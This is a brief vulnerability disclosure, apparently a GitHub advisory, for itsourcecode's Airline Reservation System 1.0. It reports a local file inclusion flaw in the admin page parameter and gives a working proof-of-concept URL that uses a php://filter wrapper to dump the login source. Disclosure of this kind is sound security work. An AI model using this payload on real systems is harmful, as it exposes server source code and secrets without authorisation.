# Vendor

itsourcecode

# Product

Airline Reservation System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/03/Airline-Reservation-System-PHP-Project-Source-Code.zip

# Description

In the site's /admin/index.php page, due to insufficient filtering of the page parameter, an attacker can construct a special POC to achieve local file inclusion.
<img width="1437" alt="image" src="https://github.com/user-attachments/assets/04941c19-a56b-426c-8a95-bd1f1faddf09">

# PoC
```
http://192.168.17.22/admin/index.php?page=php://filter/convert.base64-encode/resource=login
```
<img width="1675" alt="image" src="https://github.com/user-attachments/assets/e1d9f57f-d278-420a-bef2-64d2f2adcedf">
